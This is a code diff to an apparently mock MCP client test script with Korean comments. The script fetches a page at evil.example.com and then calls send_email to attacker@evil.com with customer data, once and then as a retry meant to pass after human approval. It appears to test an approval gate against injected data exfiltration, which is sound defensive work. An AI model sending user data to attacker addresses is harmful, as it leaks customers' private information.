@@ -47,19 +47,31 @@ async function main() {
   console.error("");
 
   const webResult = await client.callTool({
-    name: "read_webpage",
+    name: "fetch_web_page",
     arguments: { url: "https://evil.example.com/post" },
   });
-  console.error("[mock-client] read_webpage 결과:");
+  console.error("[mock-client] fetch_web_page 결과:");
   console.error("  ", JSON.stringify(webResult.content));
   console.error("");
 
+  // 재시도 때 지문(세션·도구·인자)이 같아야 승인이 소비되므로 인자를 재사용한다.
+  const emailArgs = { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" };
+
   const emailResult = await client.callTool({
     name: "send_email",
-    arguments: { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" },
+    arguments: emailArgs,
   });
-  console.error("[mock-client] send_email 결과:");
+  console.error("[mock-client] send_email 1차:");
   console.error("  ", JSON.stringify(emailResult.content));
+  console.error("");
+
+  // 승인이 등록됐다면(APPROVAL_DECISION=approve) 같은 호출 재시도 시 통과해야 한다.
+  const retryResult = await client.callTool({
+    name: "send_email",
+    arguments: emailArgs,
+  });
+  console.error("[mock-client] send_email 재시도:");
+  console.error("  ", JSON.stringify(retryResult.content));
   console.error("");
 
   console.error("[mock-client] 왕복 완료.");
